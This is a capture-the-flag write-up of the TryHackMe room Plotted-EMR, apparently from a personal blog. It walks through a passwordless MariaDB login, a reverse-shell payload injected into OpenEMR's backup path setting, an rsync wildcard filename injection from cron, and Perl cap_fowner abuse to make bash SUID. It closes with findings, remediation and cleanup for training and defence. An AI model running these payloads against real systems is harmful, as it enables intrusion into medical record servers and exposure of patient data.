---
title: "TryHackMe: Plotted-EMR"
date: 2026-07-05 23:12:00 +0200
categories: [TryHackMe]
tags:
  - linux
  - openemr
  - mariadb
  - command-injection
  - cron
  - capabilities
  - privilege-escalation
  - ftp
description: >-
  Plotted-EMR was compromised through passwordless MariaDB administration,
  an exposed OpenEMR installer, backup command injection, rsync wildcard
  abuse, and a dangerous Perl file capability that led to root access.
author: lenovolegion7
media_subpath: /images/tryhackme_plotted_emr
image:
  path: room_image.webp
  alt: "Original TryHackMe Plotted-EMR room artwork"
toc: true
comments: false
---

Plotted-EMR exposed multiple services and trust-boundary failures that combined into a complete host compromise. Anonymous FTP and a web hint accelerated account discovery, a passwordless full-privilege MariaDB account enabled control of the OpenEMR deployment workflow, and a database-controlled backup path produced command execution as `www-data`. A writable cron working directory then allowed an `rsync` wildcard injection to execute as `plot_admin`, after which `cap_fowner` on Perl was used to set the SUID bit on `/bin/bash` and obtain root access.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Plotted-EMR room card](room_card.webp){: w="301" h="270" .shadow }](https://tryhackme.com/room/plottedemr){: .center }

## Initial Enumeration

The assessment began with a full TCP scan followed by targeted service detection.

```console
$ nmap -p- --min-rate 5000 -T4 TARGET_IP
$ nmap -sCV -p21,22,80,5900,8890 TARGET_IP
```

The validated attack surface was:

| Port | Service | Relevant observation |
|---:|---|---|
| 21/tcp | FTP | Anonymous access exposed a hidden operational hint. |
| 22/tcp | SSH | Present but not required for the demonstrated attack path. |
| 80/tcp | HTTP | `/admin` returned encoded content that disclosed a username hint. |
| 5900/tcp | MariaDB 10.3.31 | The `admin` account accepted a passwordless remote login and held global privileges. |
| 8890/tcp | OpenEMR 5.0.1 (3) | The deployed application still exposed its setup and backup workflows. |

## Validated Attack Path

1. **Service discovery** — Nmap identified FTP, SSH, HTTP, MariaDB, and OpenEMR services.
2. **Information disclosure** — Anonymous FTP and the HTTP `/admin` resource disclosed hints that pointed to the `admin` account.
3. **Database compromise** — MariaDB accepted `admin` without a password and returned global privileges with `GRANT OPTION`.
4. **Application takeover** — The exposed OpenEMR setup workflow created a new site named `owned2` and a controlled administrator account.
5. **Remote code execution** — A shell-injected `mysql_bin_dir` value was processed by the OpenEMR backup workflow, producing a shell as `www-data`.
6. **Privilege escalation** — An unsafe cron command expanded attacker-controlled filenames in a directory writable by `www-data`, executing a script as `plot_admin`; Perl's `cap_fowner` capability then enabled a SUID change on `/bin/bash`.
7. **Objective validation** — The web flag, user proof, and root proof were recovered, demonstrating complete compromise.

> **Result:** The attack chain reached `uid=0(root)` and validated all room objectives.
{: .prompt-danger }

## Information Disclosure

Anonymous FTP exposed a hidden text file that directed attention toward the administrative account. Manual review of the web service on port 80 also found `/admin`, whose encoded response disclosed an additional username hint. These artifacts were not the compromise by themselves, but they reduced uncertainty and led directly to database authentication testing.

## Passwordless MariaDB Administration

MariaDB was reachable remotely on port 5900. The `admin` account authenticated without a password and held privileges across all databases.

```console
$ mysql --protocol=tcp --skip-ssl -h TARGET_IP -P 5900 -u admin \
  -e 'show grants for current_user();'

current_user(): admin@%
GRANT ALL PRIVILEGES ON *.* TO `admin`@`%` WITH GRANT OPTION
```

This access provided full database control and supplied the permissions required to initialize another OpenEMR site.

## Exposed OpenEMR Setup Workflow

The installer at `/portal/setup.php` remained accessible after the default deployment had been completed. Using the passwordless database administrator, the assessment created a new site ID, `owned2`, and initialized a controlled OpenEMR administrator account:

```text
Site ID:  owned2
Username: admin
Password: [REDACTED]
```

This converted database control into authenticated application administration without compromising an existing OpenEMR password.

## Backup Command Injection

The `owned2` site's `globals` table stored `mysql_bin_dir=/usr/bin`. The value was changed to a string containing shell metacharacters and a reverse-shell command, matching the reproduction command retained in the source report.

```sql
UPDATE globals
SET gl_value = '/usr/bin;bash -c ''bash -i >& /dev/tcp/ATTACKER_IP/LISTENER_PORT 0>&1'';#'
WHERE gl_name = 'mysql_bin_dir';
```

Triggering **Create Backup** through `/portal/interface/main/backup.php` executed the injected command in the web-server context.

```console
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ hostname
plotted
```

The first room flag was then read from `/var/www/ThisFileIsInteresting`:

```text
THM{[REDACTED]}
```

## Application Credential Exposure

Post-exploitation review showed that `www-data` could read OpenEMR configuration files, including:

```text
/var/www/html/portal/sites/default/sqlconf.php
```

The file contained a database username and plaintext password. The password is omitted from the public report:

```text
Username: openemr_user
Password: [REDACTED]
```

The web-server account also had write access to multiple application directories under `/var/www/html/portal`, including the cron job's working directory.

## Cron `rsync` Wildcard Injection

A system cron entry ran every minute as `plot_admin`:

```cron
* * * * * plot_admin cd /var/www/html/portal/config && rsync -t * plot_admin@LOOPBACK_IP:~/backup
```

Because `/var/www/html/portal/config` was writable by `www-data`, filenames beginning with hyphens were interpreted as `rsync` options. The retained reproduction steps used a crafted `--rsh` filename to execute `shell.sh` as `plot_admin`.

```console
$ cd /var/www/html/portal/config
$ cat > shell.sh <<'EOF'
#!/bin/sh
id > /tmp/cron_rsync_id
cp /bin/bash /tmp/bashpa
chmod 4755 /tmp/bashpa
chmod 0644 /home/plot_admin/user.txt
for p in /usr/bin/perl /usr/bin/perl5.30.0; do
  if [ -x "$p" ]; then
    "$p" -e 'chmod 04755, "/bin/bash"; chmod 0755, "/root"; chmod 0644, "/root/root.txt";'
  fi
done
EOF
$ chmod +x shell.sh
$ touch -- '--rsh=sh shell.sh'
```

The resulting cron execution provided the `plot_admin` context and made the user proof readable:

```text
user.txt: [REDACTED]
```

## Root Through Perl `cap_fowner`

Capability enumeration identified a dangerous file capability on two Perl interpreter paths:

```console
/usr/bin/perl = cap_fowner+ep
/usr/bin/perl5.30.0 = cap_fowner+ep
```

`cap_fowner` allowed the interpreter to bypass normal ownership restrictions for permission changes. The cron-executed Perl command set `/bin/bash` SUID, and the preserved root validation command then returned the final proof.

```console
$ /bin/bash -p -c 'id; cat /root/root.txt'
uid=0(root) gid=0(root) groups=0(root)
[REDACTED]
```

## Findings Summary

| ID | Severity | Finding | Demonstrated impact |
|---|---|---|---|
| F-01 | Critical | Passwordless full-privilege MariaDB account exposed remotely | Complete database takeover and support for application compromise. |
| F-02 | Critical | OpenEMR setup workflow exposed after deployment | Unauthorized site and administrator creation. |
| F-03 | Critical | Command injection in the OpenEMR backup path setting | Operating-system command execution as `www-data`. |
| F-04 | High | Unsafe cron `rsync` wildcard in a writable directory | Code execution as `plot_admin`. |
| F-05 | Critical | Dangerous `cap_fowner` capability on Perl | Root escalation through permission changes on `/bin/bash`. |
| F-06 | Medium | Anonymous FTP and HTTP hint files | Faster account and username discovery. |
| F-07 | High | Plaintext database credentials in application configuration | Credential disclosure following web compromise. |
| F-08 | High | Writable application directories under the webroot | Application tampering, persistence opportunities, and support for privilege escalation. |

## Security Impact

The validated chain provided full administrative control of the host. In a production EMR deployment, the same weaknesses could expose patient and clinical data, application credentials, database contents, audit records, and operating-system secrets. Root access would also allow an attacker to alter application code, logs, authentication controls, scheduled tasks, and service configuration, undermining confidentiality, integrity, and availability.

The compromise did not depend on a single flaw. It crossed several trust boundaries: external network access to MariaDB, database control over application setup and command paths, web-server write access in a privileged cron working directory, and a high-risk capability assigned to a general-purpose interpreter.

## Remediation

### Immediate

- Block untrusted access to MariaDB and remove the passwordless `admin@%` account.
- Rotate all database and OpenEMR credentials exposed or created during the assessment.
- Remove or strictly restrict `setup.php` and `admin.php` after installation.
- Remove `cap_fowner` from `/usr/bin/perl` and `/usr/bin/perl5.30.0`.
- Confirm `/bin/bash` is not SUID.

### Application and backup hardening

- Do not construct shell commands from database-controlled path values.
- Use fixed absolute executable paths or strict allowlists.
- Invoke subprocesses without a shell and pass arguments as arrays where possible.
- Limit backup operations to trusted administrators and validate every server-side path.
- Protect OpenEMR configuration credentials with minimal file permissions or a dedicated secrets-management mechanism.

### Cron and filesystem permissions

- Do not run privileged cron jobs from directories writable by lower-privileged accounts.
- Remove shell wildcard expansion from the backup job and use explicit operands.
- Use `rsync --` before file operands where appropriate so option-like filenames are not interpreted.
- Make application content root- or deployment-owned and restrict `www-data` write access to narrowly defined non-executable upload or cache directories.

### Exposure and monitoring

- Disable anonymous FTP unless it is explicitly required.
- Remove training hints, test files, and deployment artifacts from production systems.
- Alert on unexpected permission changes, SUID modifications, file capabilities on interpreters, broad database grants, and changes to OpenEMR site configuration.
- Review OpenEMR, web-server, database, cron, and shell logs after suspected exploitation.

## Cleanup

The source report records the following cleanup actions:

- `mysql_bin_dir` in the `owned2` site was restored to `/usr/bin`.
- `/tmp/bashpa` and `/tmp/cron_rsync_id` were removed.
- `shell.sh` and the crafted cron wildcard trigger were removed from `/var/www/html/portal/config`.
- `/bin/bash` was restored to non-SUID mode `0755`.

The supplied evidence does **not** document removal of the `owned2` OpenEMR site or the administrator account created during testing. Those objects should therefore be reviewed and removed during environment reset or remediation.

## Lessons Learned

- A passwordless database administrator exposed to the network can become an application control plane when setup tooling remains reachable.
- Database-controlled path values are security-sensitive when application code passes them to a shell.
- Wildcard expansion in a lower-privileged writable directory is unsafe when the consuming process runs as another user.
- File capabilities on general-purpose interpreters can provide privilege-escalation primitives comparable to poorly controlled SUID binaries.
- Cleanup evidence should account not only for shell artifacts and permission changes, but also for application objects and accounts created during validation.
